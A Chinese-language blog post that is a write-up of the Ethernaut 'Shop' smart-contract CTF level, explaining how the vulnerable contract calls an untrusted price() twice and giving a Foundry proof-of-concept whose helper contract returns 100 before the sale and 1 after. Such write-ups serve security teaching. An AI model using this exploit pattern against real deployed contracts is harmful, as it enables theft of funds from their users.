---
title: "Shop"
date: 2026-07-20
draft: false
description: "使shop的价格低于售价"
tags:
  - Ethernaut
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

### Shop

#### 目标：

使shop的价格低于售价

#### 思路：

观察合约源码，想要成功改变价格需要调用`buy`函数，必须写一个中间合约。由于 `buy()` 中将 `msg.sender` 转换为 `IBuyer` 接口，并调用 `msg.sender.price()`，如果直接用钱包调用，`msg.sender`即为钱包，钱包中并不能提供函数逻辑，调用`price()`的时候会失败

这是这个合约的主要漏洞，调用了两次`price` 函数。所以需要在中间合约中写一个`price()`函数，这个函数将会被调用两次，第一次返回的价格应该大于等于100，第二次返回的价格应该小于100

#### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

#### poc：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Shop.sol";

contract Middle{
    Shop shop = Shop(0x1aDE9F16EF5f9e07ec386FE16eC3651F8438CA70);

    function attack() external{
        shop.buy();
    }

    function price() external view returns (uint256){
        if (shop.isSold())
        {
            return 1;
        }
        else{
            return 100;
        }
    }
}
contract Attack is Script{

    function run() external{
        vm.startBroadcast();

        Middle middle = new Middle();
        middle.attack();

        vm.stopBroadcast();
    }
}
```

